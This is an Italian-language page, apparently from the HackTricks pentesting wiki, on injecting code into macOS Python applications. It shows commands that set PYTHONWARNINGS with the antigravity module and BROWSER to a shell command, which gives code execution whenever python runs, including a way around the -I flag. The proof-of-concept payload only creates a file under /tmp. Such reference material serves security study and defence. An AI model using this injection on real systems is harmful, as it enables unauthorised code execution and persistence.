# macOS Python Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Tramite le variabili d'ambiente `PYTHONWARNINGS` e `BROWSER`

È possibile modificare entrambe le variabili d'ambiente per eseguire codice arbitrario ogni volta che viene chiamato python, ad esempio:
```bash
# Generate example python script
echo "print('hi')" > /tmp/script.py

# RCE which will generate file /tmp/hacktricks
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
{{#include ../../../banners/hacktricks-training.md}}
